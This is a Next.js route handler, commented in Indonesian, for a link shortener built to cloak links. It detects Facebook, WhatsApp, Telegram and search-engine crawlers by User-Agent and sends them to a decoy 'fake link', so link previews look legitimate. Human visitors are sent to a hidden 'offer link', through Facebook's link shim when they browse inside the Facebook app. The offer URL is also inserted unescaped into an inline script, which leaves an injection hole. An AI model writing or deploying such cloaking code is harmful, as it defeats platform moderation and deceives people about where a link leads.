import { turso } from "@/lib/turso";
import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export const fetchCache = 'force-no-store';

export async function GET(request, { params }) {
  try {
    const resolvedParams = await params;
    const shortcode = resolvedParams.shortcode;

    // 1. Baca identitas (User-Agent)
    const userAgent = request.headers.get('user-agent') || '';

    // 2. Deteksi Bot Sosial Media (MURNI SCRAPER)
    const isBot = /facebookexternalhit|whatsapp|telegrambot|twitterbot|googlebot|bingbot|slurp|spider/i.test(userAgent);

    // 3. Cari data link
    const result = await turso.execute({
      sql: "SELECT * FROM links WHERE short_code = ?",
      args: [shortcode]
    });

    if (result.rows.length === 0) {
      return NextResponse.redirect(new URL('/', request.url));
    }

    const data = result.rows[0];

    const noCacheHeaders = {
      'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0',
      'Pragma': 'no-cache',
      'Expires': '0',
    };

    // ==========================================
    // LOGIKA CLOAKING BRUTAL SESUAI KONSEP LO
    // ==========================================

    if (isBot) {
      // BOT FB -> Lempar murni ke Fake Link biar domain di preview 100% sempurna
      let fakeUrl = data.fake_link || 'google.com'; 
      if (!fakeUrl.startsWith('http')) fakeUrl = 'https://' + fakeUrl;
      
      return NextResponse.redirect(new URL(fakeUrl), { 
        status: 302, 
        headers: noCacheHeaders 
      });
      
    } else {
      // MANUSIA ASLI -> Hitung Klik & Eksekusi Jurus Paksa Eksternal
      await turso.execute({
        sql: "UPDATE links SET click_count = click_count + 1 WHERE short_code = ?",
        args: [shortcode]
      });

      let offerUrl = data.offer_link || 'google.com';
      if (!offerUrl.startsWith('http')) offerUrl = 'https://' + offerUrl;
      
      // JURUS NOTIF BAWAAN FB (FB LINK SHIM)
      const encodedOffer = encodeURIComponent(offerUrl);
      const fbShimUrl = `https://l.facebook.com/l.php?u=${encodedOffer}`;
      
      // Halaman eksekutor untuk menendang user berdasarkan browser mereka
      const html = `
        <!DOCTYPE html>
        <html>
        <head>
          <meta charset="utf-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <script>
            // Deteksi apakah manusia ini buka dari dalam aplikasi FB
            var ua = navigator.userAgent || navigator.vendor || window.opera;
            var isFBApp = (ua.indexOf("FBAV") > -1 || ua.indexOf("FBAN") > -1);

            if (isFBApp) {
              // Jika buka di FB Biru/Lite: Paksa munculin Notif Bawaan FB
              window.location.replace("${fbShimUrl}");
            } else {
              // Jika buka di Chrome/Browser Luar: Langsung sikat ke Offer Link
              window.location.replace("${offerUrl}");
            }
          </script>
        </head>
        <body style="background-color: #ffffff;"></body>
        </html>
      `;

      return new NextResponse(html, {
        status: 200, 
        headers: { 'Content-Type': 'text/html', ...noCacheHeaders },
      });
    }

  } catch (error) {
    console.error("System Error Route:", error);
    return new NextResponse("Server Crash: " + error.message, { status: 500 });
  }
}
